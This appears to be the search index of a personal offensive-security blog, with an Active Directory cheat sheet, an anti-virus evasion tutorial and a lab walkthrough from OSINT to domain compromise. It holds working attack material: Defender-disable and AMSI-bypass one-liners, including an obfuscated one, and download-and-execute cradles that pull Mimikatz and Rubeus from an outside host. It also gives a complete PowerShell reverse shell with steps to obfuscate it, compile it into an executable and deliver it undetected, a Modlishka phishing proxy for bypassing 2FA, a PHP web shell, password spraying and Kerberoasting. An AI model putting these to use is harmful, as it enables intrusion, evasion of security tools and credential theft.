{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Security Stuff","text":"<ul> <li>Basic Anti-Virus Evasion</li> <li>From OSINT into Domain Admin</li> </ul>"},{"location":"#writeups","title":"Writeups","text":"<ul> <li>HTB Machines Writeups</li> </ul>"},{"location":"#active-directory","title":"Active Directory","text":"<ul> <li>Active Directory</li> </ul>"},{"location":"AD/","title":"General","text":""},{"location":"AD/#oneliners","title":"Oneliners","text":"<p>Disable Defender <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true\n</code></pre> Powershell AMSI Bypass  <pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre></p>"},{"location":"AD/#recon","title":"Recon","text":""},{"location":"AD/#host-scan","title":"Host Scan","text":"<pre><code># NetDiscover (ARP Scanning):\n- netdiscover -i eth0\n- netdiscover -r 172.21.10.0/24\n\n# Nmap:\n\n- nmap -sn 172.21.10.0/24\n- nmap -sn 172.21.10.1-253\n- nmap -sn 172.21.10.*\n\n# Nbtscan: \n- nbtscan -r 172.21.1.0/24\n\n# Linux Ping Sweep (Bash)\n\n- for i in {1..254} ;do (ping -c 1 172.21.10.$i | grep \"bytes from\" &amp;) ;done\n\n# Windows Ping Sweep (Run on Windows System)\n\n- for /L %i in (1,1,255) do @ping -n 1 -w 200 172.21.10.%i &gt; nul &amp;&amp; echo 192.168.1.%i is up.\n</code></pre>"},{"location":"AD/#bloodhound","title":"BloodHound","text":"<p>Download it from here <pre><code># /usr/lib/bloodhound/resources/app/Collectors/\n# From Local Windows host\nrun as /netonly /user:domain\\user cmd \npowershell -ep bypass \n. .\\SharpHound.ps1\ninvoke-bloodhound -CollectionMethod all </code></pre></p>"},{"location":"AD/#enumeration","title":"Enumeration","text":""},{"location":"AD/#null-session","title":"Null Session","text":""},{"location":"AD/#initial-access","title":"Initial Access","text":""},{"location":"AD/#kerberoasting","title":"Kerberoasting","text":""},{"location":"AD/#spn-service-account","title":"SPN Service Account","text":"<pre><code># Get all SPN accounts\nGetUserSPNs.py domain/user:'password' -request\n# Crack the ticket\nhashcat -a 0 -m 13100 hash\n</code></pre>"},{"location":"AD/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"AD/#lateral-movement","title":"Lateral Movement","text":""},{"location":"AD/#defense-evasion","title":"Defense Evasion","text":""},{"location":"AD/#bypass-amsi","title":"Bypass AMSI","text":"<ul> <li> <p>Get any AMSI bypass method from the following link <pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre></p> </li> <li> <p>In Windows, run PowerShell ISE and install <code>steroids</code>. Link: https://powershell.one/isesteroids/quickstart/install-manually</p> </li> </ul> <p>Install it manually by downloading the compressed ZIP file.</p> <ul> <li>After installing <code>steroids</code> tool, open PowerShell ISE and run the following command: </li> </ul> <pre><code>start-steroids\n</code></pre> <ul> <li>Create a new PS script and paste the AMSI bypass link. </li> <li>In tools menu, choose obfuscate code and run the obfuscator. </li> <li>Example of the generated obfuscated script: </li> </ul> <pre><code>[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)\n</code></pre> <ul> <li>Save the generated script into the local machine. Example as <code>amsi.txt</code>. </li> <li>In the target host, download the AMSI bypass script and load it in the memory. </li> </ul> <pre><code>(New-Object System.Net.WebClient).DownloadString('http://ip/amsi.txt') | iex\n</code></pre> <ul> <li> <p>At the same time, any PowerShell script can be downloaded and executed in the memory. </p> <p>Examples:</p> <ul> <li>Mimikatz</li> </ul> <pre><code>(New-Object System.Net.WebClient).DownloadString('http://ip/Invoke-Mimikatz.ps1') | iex\nInvoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' \n</code></pre> <ul> <li>BloodHound</li> </ul> <pre><code>(New-Object System.Net.WebClient).DownloadString('http://ip/Invoke-Sharphound.ps1') | iex\nInvoke-BloodHound -CollectionMethod all \n</code></pre> <ul> <li>Rubeus</li> </ul> <pre><code>(new-object system.net.web.client).downloadstring('http://ip/amsi.txt') | IEX\n$data = (new-object system.net.web.client).downloadstring('http://ip/rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program::Main(\"purge\").Split())\n[Rubeus.Program::Main(\"s4u /user:web$ /rc4:c54444 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\").Split())\n</code></pre> </li> </ul>"},{"location":"AD/#red-team","title":"Red Team","text":""},{"location":"AD/#phishing","title":"Phishing","text":"<pre><code># Sending mails through Linux \nswaks -to \"$mail\" -from \"user@security.com\" -body \"example\" -header \"Subject: example\" -server ip\n</code></pre>"},{"location":"AD/#bypass-2fa","title":"Bypass 2FA","text":"<p>Modliska revere http proxy for phishing Link Add <code>A</code> record with content <code>your domain</code> Generate SSL Certificate <pre><code>openssl genrsa -out evil.com.key 4096\nopenssl req -new -key evil.com.key -out evil.com.csr -utf8 -batch -subj '/CN=evil.com/\n</code></pre> Download modlishka and create a config file, import a key, pem file using <code>awk '{printf \"%s\\\\n\", $0}' ../evil.key</code> <pre><code>{\n\"proxyDomain\": \"evil.com\",\n\"listeningAddress\": \"ip\",\n\n\"target\": \"a.evil.com\",\n\"targetResources\": \"\",\n\"targetRules\": \"\",\n\"terminateTriggers\": \"\",\n\"terminateRedirectUrl\": \"\",\n\"trackingCookie\": \"id\",\n\"trackingParam\": \"id\",\n\"jsRules\":\"\",\n\"forceHTTPS\": false,\n\"forceHTTP\": false,\n\"dynamicMode\": false,\n\"debug\": true,\n\"logPostOnly\": false,\n\"disableSecurity\": true,\n\"log\": \"requests.log\",\n\"plugins\": \"all\",\n\"cert\": \"-----BEGIN CERTIFICATE-----\\n&lt;snip&gt;\\n-----END CERTIFICATE-----\\n\",\n\"certKey\": \"-----BEGIN RSA PRIVATE\\n&lt;snip-----END RSA PRIVATE KEY-----\\n\",\n\"certPool\": \"\"\n}\n</code></pre> Run modlishka <pre><code>./Modlishka -config modlishka.json\n</code></pre></p>"},{"location":"Posts/basic_av_evasion/","title":"Basic Anti-Virus Evasion","text":""},{"location":"Posts/basic_av_evasion/#overview","title":"Overview","text":"<p>After I obtained eCPTX certificate and completed Offshore lab from Hack The Box I learned multiple ways to bypass Anti-Virus solutions. Offshore was containing multiple machines with AV, additionally, we faced deferent Anti-Virus solution with clients. So dealt with multiple scenarios to bypass the AV. Bypassing AV can be easy just by playing with the payload or it can be complicated, depending the AV solution and how it detect the malware (signature based, behavior based, etc...). In this blog, I'll demonstrate simple method to bypass Anti-Virus to obtain reverse shell using PowerShell script. </p> <p>An overview of the steps that I'll follow: </p> <ol> <li>Using <code>Reverse-TCP</code> PowerShell script.</li> <li>Obfuscate the <code>Reverse-TCP</code> PowerShell script .</li> <li>Base64 encoding the obfuscated <code>Reverse-TCP</code> PowerShell script. </li> <li>Using AMSI bypass script.  </li> <li>Coverting the encoded script &amp; AMSI bypass script into executable file. </li> <li>Delivering the Payload. </li> </ol>"},{"location":"Posts/basic_av_evasion/#theory","title":"Theory","text":"<p>I'll explain here some of basic concepts of AMSI, how Anti-Virus products detect the malware and etc. So if you know the concepts you can skip this part. </p> <ul> <li> <p>AMSI:</p> <p>AMSI stands for Anti Malware Scan Interface. AMSI is an interface for applications and services to integrate with antimalware products. AMSI used for scanning files and memory streams, content source, URL/IP reputation checks and other techniques. </p> </li> <li> <p>Detection Methods in Anti-Virus:</p> <ul> <li>Signature Based: by matching strings, signatures, hashes and patterns of known malware from the database. </li> <li>Heuristic Based: it is similar to signature based detection in terms of searching for specific strings, it looks for commands that has malicious intent and would not be mostly found in an application.</li> <li>Behavioral Based: it looks for events created by the program. As an example, spawinng <code>cmd.exe</code> or calling a sequence of functions that indicate potential process injection. </li> <li>Sandbox Detection: In this type of detection, the program runs in virtualized environment and it is behavior is recorded, at the end all program behavior will analyzed. The anti-virus application will be able to see in details what the program will do in that environment. </li> </ul> </li> </ul>"},{"location":"Posts/basic_av_evasion/#steps","title":"Steps","text":""},{"location":"Posts/basic_av_evasion/#download-reverse-shell-ps-script","title":"Download Reverse Shell PS Script","text":"<p>Use the following PowerShell script, change listening IP and the port: <code>reverse-tcp.ps1</code> <pre><code>$client = $null;\n$stream = $null;\n$buffer = $null;\n$writer = $null;\n$data = $null;\n$result = $null;\ntry {\n\n    $client = New-Object Net.Sockets.TcpClient(\"127.0.0.1\", 9000);\n    $stream = $client.GetStream();\n    $buffer = New-Object Byte[] 1024;\n    $encoding = New-Object Text.AsciiEncoding;\n    $writer = New-Object IO.StreamWriter($stream);\n    $writer.AutoFlush = $true;\n    $bytes = 0;\n    do {\n        $writer.Write(\"PS&gt;\");\n        do {\n            $bytes = $stream.Read($buffer, 0, $buffer.Length);\n            if ($bytes -gt 0) {\n                $data = $data + $encoding.GetString($buffer, 0, $bytes);\n            }\n        } while ($stream.DataAvailable);\n        if ($bytes -gt 0) {\n            $data = $data.Trim();\n            if ($data.Length -gt 0) {\n                try {\n                    $result = Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String;\n                } catch {\n                    $result = $_.Exception | Out-String;\n                }\n                Clear-Variable -Name \"data\";\n                $length = $result.Length;\n                if ($length -gt 0) {\n                    $count = 0;\n                    do {\n                        if ($length -ge $buffer.Length) { $bytes = $buffer.Length; } else { $bytes = $length; }\n                        $writer.Write($result.substring($count, $bytes));\n                        $count += $bytes;\n                        $length -= $bytes;\n                    } while ($length -gt 0);\n                    Clear-Variable -Name \"result\";\n                }\n            }\n        }\n    } while ($bytes -gt 0);\n\n} catch {\n    Write-Host $_.Exception.InnerException.Message;\n} finally {\n    if ($writer -ne $null) {\n        $writer.Close();\n        $writer.Dispose();\n        Clear-Variable -Name \"writer\";\n    }\n    if ($stream -ne $null) {\n        $stream.Close();\n        $stream.Dispose();\n        Clear-Variable -Name \"stream\";\n    }\n    if ($client -ne $null) {\n        $client.Close();\n        $client.Dispose();\n        Clear-Variable -Name \"client\";\n    }\n    if ($buffer -ne $null) {\n        $buffer.Clear();\n        Clear-Variable -Name \"buffer\";\n    }\n    if ($result -ne $null) {\n        Clear-Variable -Name \"result\";\n    }\n    if ($data -ne $null) {\n        Clear-Variable -Name \"data\";\n    }\n    [System.GC]::Collect();\n}\n</code></pre></p>"},{"location":"Posts/basic_av_evasion/#download-invoke-obfuscator","title":"Download Invoke-Obfuscator","text":"<p>Download <code>Invoke-Obfuscator</code> from the following Github repository. </p>"},{"location":"Posts/basic_av_evasion/#obfuscate-the-reverse-shell-ps-script","title":"Obfuscate the Reverse Shell PS Script","text":"<p>In Windows host, run: </p> <pre><code>powershell -exec bypass\nImport-Module .\\Invoke-Obfuscation.psd1\nInvoke-Obfuscation\n</code></pre> <p>After running <code>Invoke-Obfuscation</code> run:</p> <pre><code>Invoke-Obfuscation&gt; set scriptpath &lt;name of reverse tcp script&gt;.ps1\nInvoke-Obfuscation&gt; string\nInvoke-Obfuscation\\String&gt; 1\n</code></pre> <p>The above script will obfuscate all strings in <code>reverse-tcp.ps1</code> script. Now, copy the result into file. I'll name it as <code>obf-reverse.ps1</code>, or type <code>out</code> in <code>Invoke-Obfuscation</code> to write the results into a file. </p>"},{"location":"Posts/basic_av_evasion/#obfuscate-the-obfuscated-script","title":"Obfuscate the Obfuscated Script","text":"<p>Run <code>PowerShell ISE</code> and install <code>steroids</code>. Link: https://powershell.one/isesteroids/quickstart/install-manually</p> <p>Tip</p> <p>Install it manually by downloading the compressed ZIP file. In order to avoid any errors in installation part.</p> <p>After installing <code>steroids</code> tool, open PowerShell ISE and run the following command: </p> <p><pre><code>start-steroids\n</code></pre> Create new <code>PS</code> script and paste the obfuscated powershell script. In Tools menu, select Obfuscate Code and choose Binary mode.</p> <p></p>"},{"location":"Posts/basic_av_evasion/#encode-the-obfuscated-ps-script","title":"Encode the Obfuscated PS Script","text":"<p>Now encode the last obfuscated PowerShell script into Base64.  <pre><code>PS &gt; $file=\"&lt;obfuscated ps script&gt;\"\nPS &gt; $fc=get-content $file\nPS &gt; $byt=[System.Text.Encoding]::UTF8.GetBytes($fc)\nPS &gt; $encodedtext=[System.Convert]::ToBase64String($byt)\nPS &gt; echo $encodedtext\n</code></pre></p>"},{"location":"Posts/basic_av_evasion/#bypass-amsi","title":"Bypass AMSI","text":"<p>Now let's move on the AMSI part,we need first to bypass the AMSI then we can run our reverse shell script. Again we will use here <code>PowerShell ISE</code> to obfuscate the script.  </p> <p>Get any AMSI bypass method from the following link: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</p> <p>Example: </p> <p><pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre> In <code>PowerShell ISE</code> create a new PS script and paste the AMSI bypass link. In Tools menu, select Obfuscate Code and choose Character mode.  Example of the generated obfuscated script: </p> <pre><code>[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)\n</code></pre> <p>Save the generated script into the local machine. Example as <code>amsi.txt</code>. </p>"},{"location":"Posts/basic_av_evasion/#memes-break","title":"Memes Break","text":"<p>Before we continue, let's have a short memes break:  </p> <p></p> <p></p> <p>Now move on to build our executable binary and deliver it into the target. </p>"},{"location":"Posts/basic_av_evasion/#building-the-executable-file","title":"Building the Executable File","text":"<p>Now we have two scripts: <code>amsi.txt</code> and <code>obf-tcp.ps1</code>, we will combine both those scripts and convert them into executable binary using <code>C Sharp</code> with the help Visual Studio.</p> <p>Let's run Visual Studio now and create new <code>C Sharp</code> project. First of all, we have to enable the <code>System.Management.Automation</code> library in order to run PowerShell commands.  </p> <p>Go to: Project - Add Reference, add the library <code>System Management Automation</code> by browsing into the following path: </p> <pre><code>C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\*\\System.Management.Automation.dll\n</code></pre> <p></p> <p>Syntax to run PowerShell commands can be found from the following link. </p> <p>Use the following <code>CS</code> program and paste your AMSI bypass and reverse shell scripts in <code>bypassamsi</code> and <code>psrun</code> parameters. </p> <p><pre><code>using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Management.Automation;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace powerreverse\n{\nclass Program\n{\nstatic void Main(string[] args)\n{\nPowerShell ps = PowerShell.Create();\nstring bypassamsi = \"\";\nstring psrun= \"\";\nps.AddScript(bypassamsi);\nps.AddScript(psrun);\nps.Invoke();\n}\n}\n}\n</code></pre> Now compile the program. </p>"},{"location":"Posts/basic_av_evasion/#delivering-the-payload","title":"Delivering The Payload","text":"<p>WARINING</p> <p>By uploading the malware into Virus Total, it will send the signature of the malware to Anti-Virus products, the generated payload can't be used again because it will be detected. Preferably, upload the executable file into https://antiscan.me/ </p> <p></p> <p>Now you can deliver the payload in the target host to obtain clean reverse shell.</p> <p></p>"},{"location":"Posts/basic_av_evasion/#references","title":"References","text":"<p>Amsi Bypass Powershell Invoke-Obfuscation System Management Automation Steroids</p>"},{"location":"Posts/osint_into_da/","title":"Overview","text":"<p>I\u2019ve had several customers come to me before a pentest and say they  think they\u2019re in a good shape because their vulnerability scan shows no  critical vulnerabilities and that they\u2019re ready for a pentest, which  then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. HAUSEC</p> <p>Active directory penetration testing it is very important in real life and PT job role, most of (at least all) the organizations have domain controller.  This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is the active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller.</p> <p>An overview of the stages of exploitation: </p> <ol> <li>OSINT</li> <li>Linux Privilege Escalation</li> <li>Pivoting</li> <li>Active Directory Enumeration </li> <li>Lateral Movement</li> <li>Kerberoasting</li> <li>Abusing Active Directory ACLs </li> <li>Constrained Delegation</li> </ol>"},{"location":"Posts/osint_into_da/#theoretical","title":"Theoretical","text":"<p>First of all, active directory is designed by Microsoft and used in most of organizations as the directory service that stores all information of the organization, such as computers, users, domains, printers and etc.  </p>"},{"location":"Posts/osint_into_da/#attack-scenario","title":"Attack Scenario","text":""},{"location":"Posts/osint_into_da/#entry-point","title":"Entry Point","text":"<p>XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was <code>xtech.com</code> with the IP Address <code>192.168.241.204</code>.</p>"},{"location":"Posts/osint_into_da/#osint","title":"OSINT","text":"<p>OSINT stands for Open-Source Intelligence which means the process of gathering public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. </p> <p>Starting from OSINT, here we will attempt to collect as much information we can about the company passively. We will focus to gather email addresses. Let's browse the company website and try to collect information from it. </p> <p></p> <p>By going into the \"Who we are\" section, we will find three different employees with their social media accounts. </p> <p></p> <p>In real world scenario email addresses can be collected from different ways. There are many public OSINT tools that can be utilize to collect not only the email addresses also many other information about the target company. Example of tools that can be used: </p> <ul> <li>Google Dorks: using google search engine, try to search for any publicly available documents from targets websites. inside those document inspect the meta-data, usually you can find usernames there.</li> <li>zoominfo: useful for collecting employees email addresses. </li> <li>rocketreach. useful for collecting employees email addresses. </li> </ul> <p>For our scenario, I made the lab basic in order to make easy it to understand. So now we collected three email addresses: </p> <ul> <li>bob.baker@xtech.local</li> <li>lonnie.hill@xtech.local</li> <li>john.doe@xtech.local</li> </ul> <p>We will use them later to conduct different attack. Moving forward in inspecting the website, we will notice an upload button that asking to upload PDF document. </p> <p></p>"},{"location":"Posts/osint_into_da/#web01","title":"Web01","text":""},{"location":"Posts/osint_into_da/#initial-access","title":"Initial Access","text":"<p>Let's try to abuse this function by uploading simple PHP file that grant us to execute commands. This can be done using the following one-liner command:  </p> <pre><code>echo '&lt;?php echo system($_GET[\"cmd\"]);?&gt;' &gt; cmd.php\n</code></pre> <p></p> <p>By uploading the PHP file, the website will response with the following:</p> <p></p> <p>The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here <code>wfuzz</code> to brute force the directory that contains the PHP file <code>cmd.php</code> </p> <pre><code>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt  --hc 404 http://192.168.241.204/FUZZ/cmd.php\n</code></pre> <p>The result of this command will be: </p> <pre><code>Target: http://192.168.241.204/FUZZ/cmd.php\nTotal requests: 4614\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n000004216:   500        0 L      0 W        0 Ch        \"uploads\"  </code></pre> <p>So we found the directory <code>uploads</code>, now we can browse into that directory but we will use <code>curl</code> instead to make HTTP GET request. </p> <pre><code>curl 'http://192.168.241.204/uploads/cmd.php?cmd=id' uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>We have now command execution in the server with the user <code>www-data</code>. To obtain reverse shell, we will upload <code>shell.php</code> which can found from the directory <code>/usr/share/laudanum/php/</code>. After upload it, setup <code>netcat</code> listener and browse into the uploaded PHP file. </p> <p></p> <p>Now we obtained reverse shell on Web01 host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: </p> <pre><code>$ which python3\n/usr/bin/python3\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@web01:/$ export TERM=xterm\nwww-data@web01:/$ ^Z # &lt;-- CRTL + Z\n\nstty raw -echo; fg # &lt;-- in local machine\n\nwww-data@web01:/$ </code></pre>"},{"location":"Posts/osint_into_da/#pivoting-to-dev01","title":"Pivoting to dev01","text":"<p>First, let's enumerate the users in this box: </p> <pre><code>www-data@web01:~/html$ cat /etc/passwd | grep -i \"/bin/bash\"\nroot:x:0:0:root:/root:/bin/bash\ndev01:x:1001:1001:devloper,devloper,,:/home/dev01:/bin/bash\n</code></pre> <p>From the above command output, we identified that there are two users <code>root</code> and <code>dev01</code>. Next, let's enumerate website files. </p> <pre><code>www-data@web01:~/html$ ls -la \ntotal 104\ndrwxr-xr-x 8 www-data www-data  4096 Dec 18 09:59 .\ndrwxr-xr-x 4 dev01 dev01  4096 Dec 17 23:52 ..\ndrwxr-xr-x 2 www-data www-data  4096 Dec 17 23:52 Admin\n-rw-r--r-- 1 www-data www-data   127 Dec 18 09:59 config.php\ndrwxr-xr-x 2 www-data www-data  4096 Dec 17 23:52 css\ndrwxr-xr-x 2 www-data www-data  4096 Dec 17 23:52 fonts\ndrwxr-xr-x 4 www-data www-data  4096 Dec 17 23:52 images\n-rw-r--r-- 1 www-data www-data 55106 Dec 18 09:52 index.html\n-rw-r--r-- 1 www-data www-data   612 Dec 18 09:04 index.nginx-debian.html\ndrwxr-xr-x 2 www-data www-data  4096 Dec 17 23:52 js\ndrwxr-xr-x 2 www-data www-data  4096 Dec 17 23:52 php\n-rw-r--r-- 1 www-data www-data   550 Dec 18 09:53 upload.php\ndrwxr-xr-x 2 www-data www-data  4096 Dec 23 21:15 uploads\n</code></pre> <p><code>config.php</code> looks interesting. By viewing it is content, we will discover user <code>dev01</code> credentials. </p> <pre><code>www-data@web01:~/html$ cat config.php\n&lt;?php $config=array(\n'DB_HOST'=&gt;'localhost',\n'DB_USERNAME'=&gt;'dev01',\n'DB_PASSWORD'=&gt;'1337D3v',\n'DB_DATABASE'=&gt;'xtechDB'\n);\n?&gt;\n</code></pre> <p>Let's verify the discovered credentials if they are valid. We can do this by switching to the user <code>dev01</code> using <code>su</code> command. </p> <pre><code>www-data@web01:~/html$ su dev01\nPassword: \ndev01@web01:/var/www/html$ id uid=1001(dev01) gid=1001(dev01) groups=1001(dev01)\n</code></pre>"},{"location":"Posts/osint_into_da/#privilege-escalation","title":"Privilege Escalation","text":"<p>In active directory PT, it is not necessary to gain root privileges in the Linux machines we can utilize that compromised Linux box to pivot into other machines in the same network. For learning purpose, we can try to escalate our privileges into root. First, checking the sudo rights of the current user. </p> <pre><code>dev01@web01:/var/www/html$ sudo -l [sudo] password for dev01: \nMatching Defaults entries for dev01 on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser dev01 may run the following commands on localhost:\n    (ALL : ALL) ALL\n</code></pre> <p>From the command output, we can identify that the user can run any commands with root privileges. We can abuse this by simply running the command <code>su</code> to switch to root. </p> <pre><code>dev01@web01:/var/www/html$ sudo su\nroot@web01:/var/www/html# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>Now we are root. Checking root directory will reveal for us a log file that contain a password. </p> <pre><code>root@web01:~# ls\nauth.log  snap\nroot@web01:~# cat auth.log\nNov 17 15:08:39 localhost sshd[621893]: Access from mail01\nNov 17 15:08:39 localhost sshd[621893]: Enter password:\nNov 17 15:08:39 localhost sshd[621893]: P@ssw0rd!\nNov 17 15:09:12 localhost sshd[621893]: Login successfull\n</code></pre> <p>Info</p> <p>It is hard to find similar scenario in real life, I made it basic in order to focus in Active Directory part and cover all the steps in Pentesting.  </p>"},{"location":"Posts/osint_into_da/#mail01","title":"Mail01","text":""},{"location":"Posts/osint_into_da/#pivot-to-mail01","title":"Pivot to Mail01","text":"<p>The previously discover log file disclose the host Mail01 in order to find it is IP address simply ping the host.</p> <pre><code>root@web01:~# ping -c 3 mail01\nPING mail01.xtech.local (10.10.10.10) 56(84) bytes of data.\n64 bytes from mail01.xtech.local (10.10.10.10): icmp_seq=1 ttl=128 time=0.446 ms\n64 bytes from mail01.xtech.local (10.10.10.10): icmp_seq=2 ttl=128 time=0.345 ms\n64 bytes from mail01.xtech.local (10.10.10.10): icmp_seq=3 ttl=128 time=0.314 ms\n\n--- mail01.xtech.local ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2023ms\n</code></pre> <p>We identified the IP address of Mail01 host which is <code>10.10.10.10</code>. As we don't have access into the internal network (<code>10.0.0.0</code>) we will use <code>chisel</code> to pivot into the internal network. To utilize <code>chisel</code> we execute the following commands: </p> <ul> <li> <p>Download <code>chisel</code> from this repo</p> </li> <li> <p>Transfer chisel to the target machine, to do this run:</p> </li> </ul> <pre><code># In local, machine open Python HTTP server\npython3 -m http.server 9002\n# In the target machine, download chisel\nwget http://ip:9001/chisel\n# Also don't forget to make chisel binary executable\nchmod +x chisel\n</code></pre> <ul> <li>Start <code>chisel</code> server in your local machine: </li> </ul> <pre><code>sudo chisel server -p 9003 --reverse\n</code></pre> <ul> <li>Run the client from the target machine. Use the flag <code>R:socks</code> to make use of Socks proxy: </li> </ul> <pre><code>./chisel client ip:9003 R:socks\n</code></pre> <p></p>"},{"location":"Posts/osint_into_da/#password-spray","title":"Password Spray","text":"<p>Lets's check if we can access Mail01 host from the web browser. Before we do that, setup socks5 proxy to do this install <code>foxyproxy</code> Firefox plugin. Then, add the following configuration: </p> <p></p> <p>Now browse Mail01 website. </p> <p></p> <p>It seems host running Outlook Web App (OWA). If we go back to OSINT stage, we discovered three email addresses. Furthermore, we discover a log file in Web01 that containing a conversation of two users one of them shared their password. With this known, we can now attempt to use that password to conduct a password spray against the collected email addresses. Here we will use <code>SprayingToolKit</code> it can be downloaded from the following repository.</p> <p>Now let's conduct password spray attack, before that we have to configure <code>proxychains</code>. </p> <ul> <li>Make sure <code>proxychains</code> configuration file pointed to Socks5 proxy (<code>127.0.0.1:1080</code>).  The configuration file should be ending with the following line <code>socks5   127.0.0.1 1080</code> </li> </ul> <pre><code>tac /etc/proxychains.conf | head -n 1\nsocks5    127.0.0.1 1080\n</code></pre> <p>Now run <code>atomizer</code> with the following flags: </p> <pre><code>proxychains -q python3 atomizer.py owa 'https://10.10.10.10/autodiscover/autodiscover.xml' 'P@ssw0rd!' emails.txt\n</code></pre> <p></p> <p>We found one valid credentials lonnie.hill with password <code>P@ssw0rd!</code>. Let's use it to login into his mailbox. </p> <p></p>"},{"location":"Posts/osint_into_da/#enumerate-lonnies-mailbox","title":"Enumerate Lonnie's Mailbox","text":"<p>First thing that we will notice an email sent by the user Bob.Baker, this email contain the following: </p> <p></p> <p>As seen in above screenshot, we obtained domain user Bob.baker password which is <code>P@ssw0rd@21</code>. </p>"},{"location":"Posts/osint_into_da/#enumerate-the-domain-controller","title":"Enumerate the Domain Controller","text":"<p>With two valid users on the domain, we can now run BloodHound to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using Python collector but it will not give us all attack paths. </p> <ul> <li>Windows:</li> </ul> <pre><code>runas /netonly /user:xtech.local\\bob.baker cmd\nP@ssw0rd@21\n\n.\\bloodhound.exe --collectionmethod all\n</code></pre> <ul> <li>Linux: </li> </ul> <pre><code>bloodhound-python -c ALL -u bob.baker -p 'P@ssw0rd@21' -d xtech.local -dc 10.10.10.10\n</code></pre> <p>After collecting Domain Controller objects run BloodHound. Search for the user Bob.Baker and inspect his attributes.</p> <p></p> <p>If we inspected his outbound control rights, we will notice that the user <code>bob.baker</code> have Generic Write privileges on the service account ExchSVC</p> <p></p>"},{"location":"Posts/osint_into_da/#pivot-to-exchsvc","title":"Pivot to ExchSVC","text":""},{"location":"Posts/osint_into_da/#abusing-generic-write-privileges","title":"Abusing Generic Write Privileges","text":"<p>BloodHound contains handy feature, which is we can see the methodology of abusing every ACL/privileges. We can view this if we hover over the link between object and clicked Help. </p> <p></p> <p></p> <ul> <li>Now how we can abuse Generic Write privileges? simply we can add Service Principle Name (SPN) attribute to the account ExchSVC. </li> </ul> <p>Service Principal Name (SPN)</p> <p>The SPN is unique identifier for the network Controller service instance, which is used by Kerberos authentication to associate a service instance with a service login account. </p> <p>Adding SPN attributes can be utilize using krbrelayx's <code>add-spn.py</code> tool. The following commands will be used: </p> <ul> <li>First add SPN attribute to the service account ExchSVC: </li> </ul> <pre><code>proxychains python3 addspn.py 10.10.10.12 -u xtech.local\\\\bob.baker -p 'P@ssw0rd@21' -t exchsvc -s cifs/mail01.xtech.local  </code></pre> <ul> <li>Then request SPN account TGT: </li> </ul> <pre><code>proxychains impacket-GetUserSPNs xtech.local/bob.baker:'P@ssw0rd@21' -dc-ip 10.10.10.12 -request\n</code></pre> <p></p> <p></p> <p>The following TGT will be retrieved: </p> <p></p> <p>The retrieved TGT can be crack using <code>hashcat</code>, let's attempt to crack it using <code>fasttrack.txt</code> wordlist</p> <pre><code>hashcat -a 0 -m 13100 spn.txt /usr/share/wordlists/fasttrack.txt --force\n</code></pre> <p></p> <p>We obtained password for the service account ExchSVC. We discovered also he is a local admin in the host web01</p> <p></p> <p>While we are having local admin privileges lets try to dump saved passwords from the LSA memory.  </p> <p></p> <p>No we have SQLSVC NTLM hash! now we can authenticate into any host using pass the hash technique. 